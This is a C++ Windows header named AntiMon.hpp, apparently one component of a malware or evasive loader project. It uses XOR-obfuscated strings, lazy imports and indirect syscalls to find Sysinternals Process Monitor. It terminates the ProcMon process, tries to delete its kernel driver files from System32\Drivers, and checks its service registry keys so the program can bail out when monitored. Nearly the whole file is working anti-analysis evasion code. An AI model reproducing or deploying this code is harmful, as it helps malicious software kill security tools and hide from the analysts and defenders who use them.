#pragma once
#include <windows.h>

#include "XorStr.hpp"
#include "Lazyimporter.hpp"
#include "IndirectSyscall.hpp"

// =============================================
//  AntiMon.hpp
//
//  Detect ProcMon kernel driver (PROCMON2x.SYS)
//  Try to mark for deletion — if locked, bail
// =============================================

namespace AntiMon {

    // FileDispositionInformation class = 13
    struct FILE_DISPOSITION_INFO {
        BOOLEAN DeleteFile;
    };

    // =============================================
    //  Kill ProcMon via window class detection
    //  PROCMON_WINDOW_CLASS is unique to ProcMon
    // =============================================

    __declspec(noinline) bool KillProcMon() {
        // user32.dll may not be loaded in no-CRT console app
        lzimpLI_FN(LoadLibraryA)(xorstr_("user32.dll"));

        HWND hWnd = lzimpLI_FN(FindWindowA)(xorstr_("PROCMON_WINDOW_CLASS"), (LPCSTR)NULL);
        if (!hWnd)
            return false;  // not running

        DWORD pid = 0;
        lzimpLI_FN(GetWindowThreadProcessId)(hWnd, &pid);
        if (pid == 0)
            return true;  // window exists but can't get PID

        HANDLE hProc = NULL;
        MY_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
        MY_OBJECT_ATTRIBUTES procOa = { sizeof(MY_OBJECT_ATTRIBUTES), NULL, NULL, 0, NULL, NULL };
        ISYSCALL(NtOpenProcess)(&hProc, (ACCESS_MASK)0x0001, &procOa, &cid);  // PROCESS_TERMINATE
        if (!hProc)
            return true;  // can't open = protected, bail

        ISYSCALL(NtTerminateProcess)(hProc, (NTSTATUS)0);
        ISYSCALL(NtClose)(hProc);

        // Spin ~100ms for process to die
        LARGE_INTEGER freq, start, now;
        lzimpLI_FN(QueryPerformanceCounter)(&start);
        lzimpLI_FN(QueryPerformanceFrequency)(&freq);
        __int64 target = start.QuadPart + (freq.QuadPart / 10);
        do {
            lzimpLI_FN(QueryPerformanceCounter)(&now);
        } while (now.QuadPart < target);

        // Verify — if window still exists, kill failed
        hWnd = lzimpLI_FN(FindWindowA)(xorstr_("PROCMON_WINDOW_CLASS"), (LPCSTR)NULL);
        return (hWnd != NULL);  // true = still alive, bail
    }

    // =============================================
    //  Try open driver file with DELETE access
    //  If file exists but can't be opened/deleted -> driver is loaded
    // =============================================

    __declspec(noinline) bool TryDeleteDriver(const wchar_t* ntPath) {
        wchar_t pathBuf[256];
        MY_UNICODE_STRING filePath;
        MY_OBJECT_ATTRIBUTES oa;

        // Copy xorstr result to stack
        size_t i = 0;
        while (ntPath[i] && i < 255) { pathBuf[i] = ntPath[i]; i++; }
        pathBuf[i] = 0;

        size_t len = i;
        filePath.Buffer = pathBuf;
        filePath.Length = (USHORT)(len * sizeof(wchar_t));
        filePath.MaximumLength = (USHORT)(256 * sizeof(wchar_t));

        oa.Length = sizeof(MY_OBJECT_ATTRIBUTES);
        oa.RootDirectory = NULL;
        oa.ObjectName = &filePath;
        oa.Attributes = OBJ_CASE_INSENSITIVE;
        oa.SecurityDescriptor = NULL;
        oa.SecurityQualityOfService = NULL;

        // First: check if file exists at all (NtQueryAttributesFile)
        F_BASIC_INFO attrInfo = { 0 };
        NTSTATUS st = ISYSCALL(NtQueryAttributesFile)(&oa, &attrInfo);
        if (!NT_SUCCESS(st))
            return false;  // doesn't exist = clean

        // File exists — try to open with DELETE
        HANDLE hFile = NULL;
        MY_IO_STATUS_BLOCK iosb = { 0 };

        st = ISYSCALL(NtOpenFile)(
            &hFile,
            DELETE | SYNCHRONIZE,
            &oa,
            &iosb,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            0x00000020 | 0x00000004  // SYNCHRONOUS_IO_NONALERT | NON_DIRECTORY_FILE
        );

        if (!NT_SUCCESS(st))
            return true;  // exists but can't open for delete = LOCKED = driver running

        // Got handle — try to mark for deletion
        FILE_DISPOSITION_INFO dispInfo;
        dispInfo.DeleteFile = TRUE;

        st = ISYSCALL(NtSetInformationFile)(hFile, &iosb, &dispInfo, sizeof(dispInfo), (ULONG)13);

        ISYSCALL(NtClose)(hFile);

        if (!NT_SUCCESS(st))
            return true;  // can't delete = still locked

        return false;  // deleted successfully = was leftover, not running
    }

    // =============================================
    //  Check service registry key for ProcMon
    //  Services\PROCMON2x -> if exists, driver was installed
    // =============================================

    __declspec(noinline) bool CheckServiceKey() {
        const wchar_t* svcPaths[] = {
            xorstr_(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\PROCMON24"),
            xorstr_(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\PROCMON25"),
            xorstr_(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\PROCMON26"),
        };

        for (int i = 0; i < 3; i++) {
            wchar_t pathBuf[128];
            MY_UNICODE_STRING keyPath;
            MY_OBJECT_ATTRIBUTES oa;

            size_t j = 0;
            while (svcPaths[i][j] && j < 127) { pathBuf[j] = svcPaths[i][j]; j++; }
            pathBuf[j] = 0;

            keyPath.Buffer = pathBuf;
            keyPath.Length = (USHORT)(j * sizeof(wchar_t));
            keyPath.MaximumLength = (USHORT)(128 * sizeof(wchar_t));

            oa.Length = sizeof(MY_OBJECT_ATTRIBUTES);
            oa.RootDirectory = NULL;
            oa.ObjectName = &keyPath;
            oa.Attributes = OBJ_CASE_INSENSITIVE;
            oa.SecurityDescriptor = NULL;
            oa.SecurityQualityOfService = NULL;

            HANDLE hKey = NULL;
            NTSTATUS st = ISYSCALL(NtOpenKey)(&hKey, KEY_READ, &oa);
            if (NT_SUCCESS(st)) {
                ISYSCALL(NtClose)(hKey);
                return true;  // service key exists = procmon was/is installed
            }
        }
        return false;
    }

    // =============================================
    //  Main check — returns true if ProcMon is active
    //
    //  1. Check driver files in Drivers\ and %TEMP%
    //  2. Try to delete each — if locked, driver is running
    //  3. Check service registry key
    // =============================================

    __declspec(noinline) bool IsProcMonActive() {
        // First: try to find and kill ProcMon window
        if (KillProcMon())
            return true;  // couldn't kill, bail

        // Driver file paths (ProcMon extracts to System32\Drivers)
        const wchar_t* driverPaths[] = {
            xorstr_(L"\\??\\C:\\Windows\\System32\\Drivers\\PROCMON24.SYS"),
            xorstr_(L"\\??\\C:\\Windows\\System32\\Drivers\\PROCMON25.SYS"),
            xorstr_(L"\\??\\C:\\Windows\\System32\\Drivers\\PROCMON26.SYS"),
        };

        for (int i = 0; i < 3; i++) {
            if (TryDeleteDriver(driverPaths[i]))
                return true;  // locked = running
        }

        // Check service registry
        if (CheckServiceKey())
            return true;

        return false;
    }

} // namespace AntiMon
